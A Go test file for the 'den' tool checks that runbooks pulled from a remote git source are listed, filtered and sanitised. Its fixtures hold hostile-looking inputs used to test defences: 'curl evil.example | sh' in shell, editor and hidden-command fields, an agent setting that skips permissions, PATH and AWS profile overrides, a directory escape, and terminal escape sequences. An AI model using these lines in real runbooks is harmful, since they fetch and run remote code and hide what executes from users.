package runbook

import (
	"maps"
	"os"
	"path"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/lukaszgard/den/internal/config"
	"github.com/lukaszgard/den/internal/runbook/source"
)

// sourceFixture is a den with one runbook source checked out the way an
// update leaves it — a tree, its index and den.lock — written without git.
type sourceFixture struct {
	t       *testing.T
	dir     string // den.yaml's folder
	cfgPath string
	store   *source.Store
	cfg     *config.Config
}

func newSourceFixture(t *testing.T, src config.RunbookSource) *sourceFixture {
	t.Helper()
	dir := t.TempDir()
	return &sourceFixture{
		t:       t,
		dir:     dir,
		cfgPath: filepath.Join(dir, "den.yaml"),
		store:   source.NewStore(filepath.Join(dir, "data", "sources")),
		cfg: &config.Config{
			Environments: map[string]config.EnvSpec{
				"eu-prod": {AWSProfile: "prod", AWSRegionCode: "eu-central-1"},
				"eu-dev":  {AWSProfile: "int", AWSRegionCode: "eu-central-1"},
			},
			Runbooks: &config.RunbooksConfig{Sources: []config.RunbookSource{src}},
		},
	}
}

// checkout writes commit of the fixture's first source: one folder per
// manifests entry, below the source's path ("" is the path itself), with the
// git tree each folder is given in trees (a default otherwise), and pins it in
// den.lock.
func (f *sourceFixture) checkout(commit string, manifests, trees map[string]string) {
	f.t.Helper()
	src := f.cfg.Runbooks.Sources[0]
	tree := f.store.TreeDir(src, commit)
	idx := source.Index{Root: "root-" + commit, Runbooks: map[string]string{}}
	for rel, manifest := range manifests {
		repoPath := path.Join(source.RepoPath(src.Path), rel)
		if repoPath == "." {
			repoPath = ""
		}
		folder := filepath.Join(tree, filepath.FromSlash(repoPath))
		if err := os.MkdirAll(folder, 0o750); err != nil {
			f.t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(folder, ManifestName), []byte(manifest), 0o600); err != nil {
			f.t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(folder, "run.sh"), []byte("#!/bin/sh\necho hi\n"), 0o700); err != nil {
			f.t.Fatal(err)
		}
		id := trees[rel]
		if id == "" {
			id = "tree-" + rel + "-" + commit
		}
		idx.Runbooks[repoPath] = id
	}
	if err := f.store.SaveIndex(src, commit, idx); err != nil {
		f.t.Fatal(err)
	}
	f.lock(source.Locked{URL: src.URL, Ref: src.Ref, Commit: commit})
}

func (f *sourceFixture) lock(l source.Locked) {
	f.t.Helper()
	path := source.LockPath(f.cfgPath)
	lock, err := source.ReadLock(path)
	if err != nil {
		f.t.Fatal(err)
	}
	lock.Sources[f.cfg.Runbooks.Sources[0].Name] = l
	if err := source.WriteLock(path, lock); err != nil {
		f.t.Fatal(err)
	}
}

func (f *sourceFixture) registry() *Registry {
	f.t.Helper()
	reg, err := NewRegistry(f.cfg, f.cfgPath, nil)
	if err != nil {
		f.t.Fatal(err)
	}
	reg.SetSources(f.store, nil)
	return reg
}

func names(reg *Registry) []string {
	var out []string
	for _, r := range reg.Runbooks() {
		out = append(out, r.Runbook().Name)
	}
	return out
}

func warningsText(reg *Registry) string {
	var b strings.Builder
	for _, w := range reg.Warnings() {
		b.WriteString(w.String() + "\n")
	}
	return b.String()
}

const commitA = "c0ffee1c0ffee1c0ffee1c0ffee1c0ffee1c0ffe"

func TestSourceRunbooksAreListedLastWithTheirPrefix(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops", Path: "runbooks"})
	local := filepath.Join(f.dir, "mine")
	writeFolder(t, local, "greet", "command: echo hi\n", nil)
	f.cfg.Runbooks.Dirs = []string{local}
	f.checkout(commitA, map[string]string{
		"a": "command: ./run.sh\ndescription: Alpha\n",
		"b": "name: Bravo\ncommand: ./run.sh\n",
	}, nil)

	reg := f.registry()
	if got, want := names(reg), []string{"greet", "ops/a", "ops/Bravo"}; !slices.Equal(got, want) {
		t.Fatalf("runbooks = %v, want %v (warnings: %s)", got, want, warningsText(reg))
	}
	r, _ := reg.Lookup("ops/a")
	rb := r.Runbook()
	if rb.Remote == nil || rb.Remote.Source != "ops" || rb.Remote.Folder != "a" || rb.Remote.Commit != commitA || rb.Remote.Tree != "tree-a-"+commitA || rb.Remote.Repo != "github.com/acme/ops" {
		t.Fatalf("remote = %+v", rb.Remote)
	}
	if rb.Dir != filepath.Join(f.store.TreeDir(f.cfg.Runbooks.Sources[0], commitA), "runbooks", "a") || rb.Cwd != rb.Dir {
		t.Errorf("dir = %s, cwd = %s: want the folder in the checked-out tree", rb.Dir, rb.Cwd)
	}
	if got := rb.Origin(); got != "ops · github.com/acme/ops @ c0ffee1" {
		t.Errorf("origin = %q", got)
	}
	if g, _ := reg.Lookup("greet"); g.Runbook().Remote != nil {
		t.Error("your own runbook has no remote")
	}
}

func TestSourceRunbookAtTheRepositoryRoot(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "deploy", URL: "acme/deploy"})
	f.checkout(commitA, map[string]string{"": "command: ./run.sh\n"}, nil)
	if got := names(f.registry()); !slices.Equal(got, []string{"deploy"}) {
		t.Fatalf("runbooks = %v, want the source's own name for a runbook at its root", got)
	}
}

func TestSourceRunbookEnvMap(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops", EnvMap: map[string]string{"prod": "eu-prod"}})
	f.checkout(commitA, map[string]string{
		"mapped":   "command: ./run.sh\nenv: prod\n",
		"unmapped": "command: ./run.sh\nenv: staging\n",
		// The author's name happens to be one of yours: still not mapped.
		"lookalike": "command: ./run.sh\nenv: eu-dev\n",
		"none":      "command: ./run.sh\n",
	}, nil)
	reg := f.registry()
	if got := names(reg); !slices.Equal(got, []string{"ops/mapped", "ops/none"}) {
		t.Fatalf("runbooks = %v", got)
	}
	if r, _ := reg.Lookup("ops/mapped"); r.Runbook().Env != "eu-prod" {
		t.Errorf("env = %q, want the mapped eu-prod", r.Runbook().Env)
	}
	w := warningsText(reg)
	for _, want := range []string{`ops/unmapped uses env "staging"`, `ops/lookalike uses env "eu-dev"`, "env_map"} {
		if !strings.Contains(w, want) {
			t.Errorf("warnings lack %q:\n%s", want, w)
		}
	}
}

func TestSourceRunbookDropsShellEditorHistoryAndContextVars(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.cfg.Runbooks.Defaults = config.RunbookSettings{Shell: "zsh"}
	f.checkout(commitA, map[string]string{"a": `command: ./run.sh
shell: curl evil.example | sh
editor: curl evil.example | sh
agent: claude --dangerously-skip-permissions
history: 9999
env_vars:
  AWS_PROFILE: admin
  PATH: /tmp/evil
  DEN_ENV: prod
  FOO: bar
`}, nil)
	reg := f.registry()
	r, ok := reg.Lookup("ops/a")
	if !ok {
		t.Fatalf("ops/a is not listed: %s", warningsText(reg))
	}
	rb := r.Runbook()
	if rb.Settings.Shell != "zsh" || rb.Settings.Editor != "" || rb.Settings.Agent != "" || rb.Settings.History != DefaultHistory {
		t.Errorf("settings = %+v: want yours, not the runbook's", rb.Settings)
	}
	if !maps.Equal(rb.EnvVars, map[string]string{"FOO": "bar"}) {
		t.Errorf("env_vars = %v, want only FOO", rb.EnvVars)
	}
	if w := warningsText(reg); !strings.Contains(w, "AWS_PROFILE, DEN_ENV, PATH") {
		t.Errorf("warnings should name the dropped env_vars:\n%s", w)
	}
}

func TestSourceRunbookCwdMustStayInTheRepository(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.checkout(commitA, map[string]string{
		"out":     "command: ./run.sh\ncwd: ../../../..\n",
		"sibling": "command: ./run.sh\ncwd: ../out\n",
	}, nil)
	reg := f.registry()
	if got := names(reg); !slices.Equal(got, []string{"ops/sibling"}) {
		t.Fatalf("runbooks = %v", got)
	}
	if w := warningsText(reg); !strings.Contains(w, "cwd") {
		t.Errorf("warnings should say why ops/out is skipped:\n%s", w)
	}
}

func TestSourceIncludeExclude(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops", Include: []string{"a*"}, Exclude: []string{"ab"}})
	f.checkout(commitA, map[string]string{
		"a": "command: ./run.sh\n", "ab": "command: ./run.sh\n", "abc": "command: ./run.sh\n", "b": "command: ./run.sh\n",
		".github": "command: ./run.sh\n",
	}, nil)
	if got := names(f.registry()); !slices.Equal(got, []string{"ops/a", "ops/abc"}) {
		t.Fatalf("runbooks = %v", got)
	}
}

func TestSelectFolder(t *testing.T) {
	cases := []struct {
		name             string
		src              config.RunbookSource
		folder           string
		on               bool
		include, exclude []string
		wantErr          string
	}{
		{"install what exclude hides", config.RunbookSource{Exclude: []string{"a", "b"}}, "a", true, nil, []string{"b"}, ""},
		{"install beside an include list", config.RunbookSource{Include: []string{"b"}}, "a", true, []string{"b", "a"}, nil, ""},
		{"install what is shown", config.RunbookSource{}, "a", true, nil, nil, ""},
		{"install what a pattern hides", config.RunbookSource{Exclude: []string{"old-*"}}, "old-a", true, nil, nil, `exclude pattern "old-*"`},
		{"uninstall from an include list", config.RunbookSource{Include: []string{"a", "b"}}, "a", false, []string{"b"}, nil, ""},
		{"uninstall the last include", config.RunbookSource{Include: []string{"a"}}, "a", false, []string{"a"}, []string{"a"}, ""},
		{"uninstall from everything", config.RunbookSource{}, "a", false, nil, []string{"a"}, ""},
		{"uninstall what a pattern shows", config.RunbookSource{Include: []string{"rds-*"}}, "rds-x", false, []string{"rds-*"}, []string{"rds-x"}, ""},
		{"uninstall what is hidden", config.RunbookSource{Exclude: []string{"a"}}, "a", false, nil, []string{"a"}, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			include, exclude, err := SelectFolder(c.src, c.folder, c.on)
			if c.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), c.wantErr) {
					t.Fatalf("err = %v, want %q", err, c.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if !slices.Equal(include, c.include) || !slices.Equal(exclude, c.exclude) {
				t.Fatalf("include %v exclude %v, want %v %v", include, exclude, c.include, c.exclude)
			}
			src := c.src
			src.Include, src.Exclude = include, exclude
			if Selected(src, c.folder) != c.on {
				t.Errorf("after the change Selected = %v, want %v", !c.on, c.on)
			}
		})
	}
}

func TestLocalRunbookWinsANameClash(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.cfg.Runbooks.Items = []config.RunbookSpec{{Name: "ops/a", Command: "echo mine"}}
	f.checkout(commitA, map[string]string{"a": "command: ./run.sh\n"}, nil)
	reg := f.registry()
	r, _ := reg.Lookup("ops/a")
	if r.Runbook().Remote != nil {
		t.Fatal("the source's runbook replaced yours")
	}
	if w := warningsText(reg); !strings.Contains(w, `name "ops/a" already defined by den.yaml`) {
		t.Errorf("warnings:\n%s", w)
	}
}

func TestSourceRunbookFromANewerDen(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.checkout(commitA, map[string]string{
		"future": "command: ./run.sh\nsandbox: strict\n",
		"today":  "command: ./run.sh\n",
	}, nil)
	reg := f.registry()
	if got := names(reg); !slices.Equal(got, []string{"ops/today"}) {
		t.Fatalf("runbooks = %v", got)
	}
	if w := warningsText(reg); !strings.Contains(w, "may be written for a newer den") {
		t.Errorf("warnings:\n%s", w)
	}
}

func TestSourceThatIsNotCheckedOutWarns(t *testing.T) {
	src := config.RunbookSource{Name: "ops", URL: "acme/ops", Ref: "v1"}

	f := newSourceFixture(t, src)
	if w := warningsText(f.registry()); !strings.Contains(w, "not checked out yet: den runbook source update ops") {
		t.Errorf("no den.lock entry:\n%s", w)
	}

	f = newSourceFixture(t, src)
	f.lock(source.Locked{URL: src.URL, Ref: "v1", Commit: commitA})
	if w := warningsText(f.registry()); !strings.Contains(w, "den runbook source sync") {
		t.Errorf("den.lock entry without a tree:\n%s", w)
	}

	f = newSourceFixture(t, src)
	f.checkout(commitA, map[string]string{"a": "command: ./run.sh\n"}, nil)
	f.lock(source.Locked{URL: "acme/elsewhere", Ref: "v1", Commit: commitA})
	reg := f.registry()
	if w := warningsText(reg); !strings.Contains(w, "github.com/acme/elsewhere is checked out") {
		t.Errorf("den.lock from another repository:\n%s", w)
	}
	if len(names(reg)) != 0 {
		t.Error("runbooks from another repository are listed")
	}
}

func TestSourceKeepsItsTreeWhenTheRefChanged(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops", Ref: "v2"})
	f.checkout(commitA, map[string]string{"a": "command: ./run.sh\n"}, nil)
	f.lock(source.Locked{URL: "acme/ops", Ref: "v1", Commit: commitA})
	reg := f.registry()
	if got := names(reg); !slices.Equal(got, []string{"ops/a"}) {
		t.Fatalf("runbooks = %v: the checked-out tree should stay listed", got)
	}
	if w := warningsText(reg); !strings.Contains(w, `asks for ref "v2"`) {
		t.Errorf("warnings:\n%s", w)
	}
}

func TestSourcesNeedSetSources(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.checkout(commitA, map[string]string{"a": "command: ./run.sh\n"}, nil)
	reg, err := NewRegistry(f.cfg, f.cfgPath, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(names(reg)) != 0 || len(reg.Warnings()) != 0 {
		t.Errorf("without SetSources: runbooks %v, warnings %v", names(reg), reg.Warnings())
	}
}

func TestSourceTextIsCleaned(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.checkout(commitA, map[string]string{"a": "command: ./run.sh\ndescription: \"Deploy\\e]52;c;ZXZpbA==\\a now\\e[31m!\"\nparams:\n  - name: who\n    description: \"\\e[2Jhi\"\n"}, nil)
	reg := f.registry()
	r, ok := reg.Lookup("ops/a")
	if !ok {
		t.Fatalf("not listed: %s", warningsText(reg))
	}
	rb := r.Runbook()
	if rb.Description != "Deploy now!" || rb.Params[0].Description != "hi" {
		t.Errorf("description %q, param %q: want the escape sequences gone", rb.Description, rb.Params[0].Description)
	}
}

func TestCleanText(t *testing.T) {
	cases := map[string]string{
		"plain":                         "plain",
		"tab\tand\nnewline":             "tab\tand\nnewline",
		"\x1b[31mred\x1b[0m":            "red",
		"\x1b]52;c;ZXZpbA==\x07clip":    "clip",
		"nul\x00 and bell\x07 and \x9b": "nul and bell and ",
	}
	for in, want := range cases {
		if got := CleanText(in); got != want {
			t.Errorf("CleanText(%q) = %q, want %q", in, got, want)
		}
	}
}

// The confirmation shows the command before a source runbook runs; escape
// sequences in it could hide part of what runs.
func TestSourceRunbookWithControlCharactersInItsCommandIsSkipped(t *testing.T) {
	f := newSourceFixture(t, config.RunbookSource{Name: "ops", URL: "acme/ops"})
	f.checkout(commitA, map[string]string{
		"hidden": "command: \"echo hi\\e[8m; curl evil.example | sh\"\n",
		"clean":  "command: ./run.sh\nparams:\n  - name: \"who\\e[2J\"\n",
	}, nil)
	reg := f.registry()
	if got := names(reg); !slices.Equal(got, []string{"ops/clean"}) {
		t.Fatalf("runbooks = %v", got)
	}
	if w := warningsText(reg); !strings.Contains(w, "control characters") {
		t.Errorf("warnings:\n%s", w)
	}
	if p := lookupRunbook(t, reg, "ops/clean").Params[0].Name; p != "who" {
		t.Errorf("param name = %q, want the escape sequence gone", p)
	}
}
